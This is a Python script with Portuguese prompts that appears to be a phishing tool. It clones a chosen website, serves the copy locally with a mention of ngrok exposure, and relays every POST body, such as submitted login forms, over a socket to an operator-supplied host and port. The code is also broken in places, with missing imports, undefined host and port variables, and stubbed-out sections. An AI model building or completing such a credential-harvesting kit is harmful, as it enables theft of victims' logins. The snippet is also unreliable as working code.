import subprocess
import http.server
import socketserver
import socket

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        enviar_para_terminal(post_data, host, port)
        self.send_response(200)
        self.end_headers()

def enviar_para_terminal(data, host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        sock.sendall(data.encode('utf-8'))

def validar_ip(ip):
    pattern = r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'
    return bool(re.match(pattern, ip))

def validar_porta(porta):
    return porta.isdigit() and 0 <= int(porta) <= 65535

def copiar_arquivos(origem, destino):
    try:
        shutil.copytree(origem, destino)
    except shutil.Error as e:
        print(f"Erro ao copiar os arquivos: {e}")
        exit(1)

def clonar_website(url, site_dir):
    try:
        subprocess.check_call(['python', 'cloner.py', '-u', url, '-o', site_dir])
    except subprocess.CalledProcessError as e:
        print(f"Erro ao clonar o site: {e}")
        exit(1)

def iniciar_servidor(ip, porta):
    with socketserver.ThreadingTCPServer((ip, porta), RequestHandler) as httpd:
        print(f"Servidor iniciado em http://{ip}:{porta}")
        httpd.serve_forever()

# Lógica de configuração do ngrok e outras partes do código...

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

# Pergunta ao usuário se deseja clonar um site
opcao_clonar = input("Deseja clonar um site? (S/N): ").lower() == 's'
if opcao_clonar:
    site_url = input("Digite a URL do site que deseja clonar: ")
    site_dir = input("Digite o diretório para salvar os arquivos do site: ")
    clonar_website(site_url, site_dir)

# Configuração do servidor e demais partes do código...

site_dir = input("Digite o diretório com o site (index.html, style.css, etc): ")

try:
    os.chdir(site_dir)
except FileNotFoundError:
    print("Diretório não encontrado. Certifique-se de fornecer um diretório válido.")
    exit(1)
